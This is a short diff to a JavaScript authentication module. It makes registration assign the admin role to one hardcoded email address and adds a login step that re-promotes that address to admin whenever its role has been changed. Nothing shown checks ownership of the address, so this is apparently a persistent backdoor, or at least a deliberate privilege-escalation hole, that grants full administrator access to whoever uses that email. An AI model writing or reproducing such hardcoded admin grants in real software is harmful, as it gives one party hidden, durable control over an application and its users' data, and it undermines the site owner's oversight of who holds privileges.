@@ -63,7 +63,7 @@ export async function register({ email, password, firstName, lastName }) {
       password: hashedPassword,
       firstName: firstName || null,
       lastName: lastName || null,
-      role: "customer",
+      role: email.toLowerCase() === 'maruflol62@gmail.com' ? "admin" : "customer",
     },
   })
 
@@ -100,6 +100,16 @@ export async function login({ email, password }) {
   }
 
   const token = signToken(user)
+
+  // Ensure admin role for specific admin email if not already set
+  if (user.email.toLowerCase() === 'maruflol62@gmail.com' && user.role !== 'admin') {
+    await prisma.user.update({
+      where: { id: user.id },
+      data: { role: 'admin' },
+    })
+    user.role = 'admin' // Update object before returning
+  }
+
   return { user: sanitizeUser(user), token }
 }
 
